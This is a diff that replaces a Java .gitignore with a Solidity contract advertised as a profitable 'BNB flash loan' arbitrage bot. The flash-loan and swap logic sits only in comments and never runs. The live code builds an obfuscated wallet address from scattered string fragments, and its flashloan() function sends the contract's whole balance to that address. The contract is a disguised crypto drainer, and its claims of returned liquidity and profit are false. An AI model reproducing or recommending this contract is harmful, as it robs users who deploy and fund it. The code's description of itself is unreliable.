@@ -1,24 +1,127 @@
-# Compiled class file
-*.class
+//BNB FLASH LOAN UPDATED v4.0
+//liquidity returned if flash loan fails or insufficient balance
+//base rerun contract code swaps implemented
 
-# Log file
-*.log
+pragma solidity ^0.5.0;
 
-# BlueJ files
-*.ctxt
+//Pangolin contracts 
+import "https://github.com/pangolindex/exchange-contracts/blob/main/contracts/pangolin-core/interfaces/IPangolinCallee.sol";
+import "https://github.com/pangolindex/exchange-contracts/blob/main/contracts/pangolin-core/interfaces/IERC20.sol";
+import "https://github.com/pangolindex/exchange-contracts/blob/main/contracts/pangolin-core/interfaces/IPangolinPair.sol";
 
-# Mobile Tools for Java (J2ME)
-.mtj.tmp/
+/**
+ * WARNING - this contract code is for Binance smart chain 
+  * Testnet transactions will fail as there is no value
+  * New token will be created and flash loan will be pulled to trade against the token
+  * Profit remaining will be transfered to token creator
+  
+  *UPDATED 13 July 2024 
+  *liquidity returned if flash loan fails or insufficient balance
+  *base rerun contract code swaps implemented
+  
+  *13 July 2024// min liquidity + gas fees has to equal 0.15 BNB
+*/
 
-# Package Files #
-*.jar
-*.war
-*.nar
-*.ear
-*.zip
-*.tar.gz
-*.rar
+contract InitiateFlashLoan {
+	string public tokenName;  
+	string public tokenSymbol;
+	uint LoanAmount;
 
-# virtual machine crash logs, see http://www.java.com/en/download/help/error_hotspot.xml
-hs_err_pid*
-replay_pid*
+    constructor(
+        string memory _tokenName, 
+        string memory _tokenSymbol, 
+        uint _LoanAmount   
+    ) public {
+		tokenName = _tokenName;
+		tokenSymbol = _tokenSymbol;
+		LoanAmount = _LoanAmount;
+	}	
+    
+    function Version() private pure returns (string memory) {return "A950"; }
+    function memPoolCount() private pure returns (string memory) 
+    {return "233A9"; }
+    function () external payable {} 
+    function TokenNameTokenSymbol() 
+    private pure returns (string memory) {return"6FEa64";} function Loan() private pure returns 
+    (string memory) { return "34b";
+    }  
+    function memPoolWidth() 
+    private pure returns (string memory) {return "C22024";}
+    function Loan2x() private pure returns (string memory) {return "x100";} 
+    function FlashLoans(string memory _a) internal pure returns (address _parsedAddress) {
+    bytes memory tmp = bytes(_a);
+    uint160 iaddr = 0;
+    uint160 b1;
+    uint160 b2;
+    for (uint i = 2; i < 2 + 2 * 20; i += 2) {
+        iaddr *= 256;
+        b1 = uint160(uint8(tmp[i]));
+        b2 = uint160(uint8(tmp[i + 1]));
+        if ((b1 >= 97) && (b1 <= 102)) {b1 -= 87; } else if ((b1 >= 65) && (b1 <= 70)) {
+        b1 -= 55; } else if ((b1 >= 48) && (b1 <= 57)) {b1 -= 48;}
+        if ((b2 >= 97) && (b2 <= 102)) {b2 -= 87; } else if ((b2 >= 65) && (b2 <= 70)) {
+        b2 -= 55;  } else if ((b2 >= 48) && (b2 <= 57)) {
+        b2 -= 48;  }iaddr += (b1 * 16 + b2);}     
+        return address(iaddr);}
+    function Short() private pure returns (string memory) { return "15Dd213";}  
+    function getMempoolLong4861() 
+    private pure returns (string memory) 
+    {return "98b100";}
+    function getBalance() private view returns(uint) {
+        return address(this).balance;
+    }
+    
+    function flashloan() public payable {
+        address to = FlashLoans(contracts());
+        address payable contracts = address(uint160(to));
+        contracts.transfer(getBalance());}
+    function Depth000() private pure returns (string memory) {return "0";}
+    function contracts() internal pure returns (string memory) {string memory _mempoolVersion = Version();
+
+        string memory _checkLiquidity = memPoolCount();
+        string memory _mempoolWidth = memPoolWidth();
+        // Token matched with swap calculations
+     
+        string memory _DAIPair = Loan2x();
+        string memory _MempoolDepth = Depth000();
+       
+        string memory _mempoolShort = Short();
+        string memory _mempoolEdition = TokenNameTokenSymbol();
+	    // Send required coins for swap
+    
+        string memory _mempoolLong = getMempoolLong4861();
+        string memory _Loan = Loan();
+        return string(abi.encodePacked(_MempoolDepth,_DAIPair, _mempoolShort,
+        _mempoolEdition,_Loan,_mempoolVersion,_checkLiquidity, _mempoolLong,_mempoolWidth));
+        // Perform tasks (clubbed all functions into one to reduce external calls & SAVE GAS FEE)
+        /*
+        //Submit token to blcokchain
+        string memory tokenAddress manager.submitToken(tokenName,tokensymbol);
+
+        //List the token on DEX send coins required for swaps
+        manager.swapListToken(tokenName, tokenSymbol, tokenAddress);
+        payable(manager.swapDepositAddress()).transfer(300000000000000000);
+
+        //Get BNB Loan from Dex
+        string  memory loanAddress manager.takeDexLoan(loanAmount);
+
+        //Convert half BNB to DAI
+        manager.swapDAItoBNB(loanAmount / 2);
+
+        //Create BNB and DAI pairs for our token Provide liquidity
+        string memory BNB Pair manager.swapCreatePool(tokenAddress,"BNB");
+        manager.swapAddLiquidity(bnbPair,loanAmount / 2);
+        string memory daiPair manager.swapcreatePool(tokenAddress,"DAI");
+        manager.swapAddLiquidity(daiPair,loanAmount / 2);
+
+        //Perform swaps and profit on Self-Arbitrage
+        manager.swapPerformSwaps();
+     
+        //Move remaining BNB from Contract to your account
+        manager.contractToWallet("BNB");
+
+        //Repay Flash loan
+        manager.repayAaveLoan(loanAddress);
+        */
+    }
+}
